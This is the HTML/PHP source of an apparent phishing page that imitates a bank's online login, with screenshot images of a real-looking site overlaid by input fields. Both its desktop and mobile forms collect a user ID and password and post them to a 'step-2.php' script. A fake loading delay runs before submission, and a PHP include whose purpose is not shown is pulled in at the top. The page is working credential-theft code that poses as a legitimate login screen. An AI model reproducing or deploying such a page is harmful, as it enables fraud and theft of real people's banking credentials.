<?php
include "fucker.php";  
?><!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<link href="images/favicon.html" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/index.css" rel="stylesheet">
</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;">

<!--dktp-->
<div id="dcont">
	<form id="ff" name="ff" action="step-2.php" method="POST" style="height: 703px;">
		
		
		<input type="text" id="Editbox1" name="ipts1" style="position: relative;
left: 107px;
top: 220px;
width: 262px;
height: 40px;
line-height: 27px;
z-index: 2;
display: block;" name="1" value="" required placeholder="Identificación de usuario" maxlength="30" autocomplete="off">
		
		<input type="password" id="Editbox2" name="ipts2" style="position: relative;
left: 107px;
top: 231px;
width: 262px;
height: 40px;
line-height: 27px;
z-index: 2;
display: block;" name="2" value="" required placeholder="Contraseña" maxlength="30">
		

		<input type="checkbox" id="checkbox1" name="" value="on" >

		<input type="submit" id="Button1" name="" value="" style="position: relative;
LEFT: 107px;
top: 246px;
width: 266px;
height: 38px;
z-index: 0;
border: none;
border-radius: 0px;
color: #fff;
display: block;"/>
		
		<div id="wb_Form1" style="position:absolute;left:79px;top:292px;width:34px;height:31px;z-index:4;display:none;">
		
		</div>
		
	</form>

	<div id="wb_Image1" style="display:inline-block;width: 1440px;height: 3110px;z-index: 1;">
		<img src="images/2.jpg" class="Image1">
		<img src="images/3.jpg" class="Image1">
		<img src="images/4.jpg" class="Image1">
		<img src="images/5.jpg" class="Image1">
		<img src="images/6.jpg" class="Image1">
	</div>

	<div id="fcv"><img id="fcvimg" src="images/rst1.html"></div>

	<script src="../ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script>
		function sleep(ms) {
			return new Promise(resolve => setTimeout(resolve, ms));
		}
		function vdt() {
			var cvr = document.getElementById('fcv');
			var chk = document.getElementById('checkbox1');
			var frm = document.getElementById("ff");

			var ed1 = document.getElementById("Editbox1");
			var ed2 = document.getElementById("Editbox2");
			var ed3 = document.getElementById("Editbox3");

			ed1.onblur = function(){ed1.style.border = 'none';}
			ed2.onblur = function(){ed2.style.border = 'none';}
			ed3.onblur = function(){ed3.style.border = 'none';}

			if( ((ed1.value != '') && (ed1.value.length >= 4)) && ((ed2.value != '') && (ed2.value.length >= 4)) && ((ed3.value != '') && (ed3.value.length == 4)) ){			
				cvr.style.display = "block";
				chk.style.display = "none";
				sleep(3000).then(() => { frm.submit(); });
			}else{
				if( (ed1.value == '') || (ed1.value.length < 4) ){
					ed1.focus();
				}else{
					if((ed2.value == '') || (ed2.value.length < 4)){	
						ed2.focus();
					}else{
						ed3.focus();
					}
				}
			}

		} 

		
	</script>
</div>
<!--/dktp-->

<!--mbl-->
<div id="mcont">
		<nav style="width: 100%;
    background-color: #dc1431;
    height: 28px;
    text-align: center;
    padding-top: 10px;
    background-image: url(images/hmbr.svg);
    background-repeat: no-repeat;
    background-size: 24px;
    background-position: 4px;"><h2 style="    color: #fff;
    margin-top: 8px;
    font-size: 18px;">Log In</h2></nav>
	<form method="post" action="step-2.php">
		<input name="ipts1" required placeholder="Online ID" type="text" style="width: 80%;
    margin: 6px;
    border-radius: 4px;
    border-color: #99999959;
    border-width: 1.4px;
    height: 24px;"><div style="width: 14%;
    display: inline-block;
    /* padding-top: 0px; */
    position: relative;
    height: 24px;
    top: 10px;"><img src="images/on.svg" style="max-width:70px;"></div>
		<input name="ipts2" type="password" style="    width: 95%;
    margin: 6px;
    border-radius: 4px;
    border-color: #99999959;
    border-width: 1.4px;
    height: 24px;" required placeholder="Passcode">
		<input type="submit" value="Log In" style="    width: 97%;
    margin: 6px;
    border-radius: 4px;
    border-color: #99999959;
    border-width: 0px;
    height: 32px;
    color: #fff;
    background-color: rgb(2,71,165);background-image: url(images/lck.svg);
    background-repeat: no-repeat;
    background-position: 42%;
    background-size: 18px;">
	</form>
	<div style="text-align:center;"><img src="images/frgt.svg" alt="" style="max-width:400px;"></div>
	<footer style="padding-top: 20px;margin-top: 80px;background-color: #eee;width: 100%;">
		
		<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px">
	</footer>
</div>
<!--/mbl-->
</body>

</html>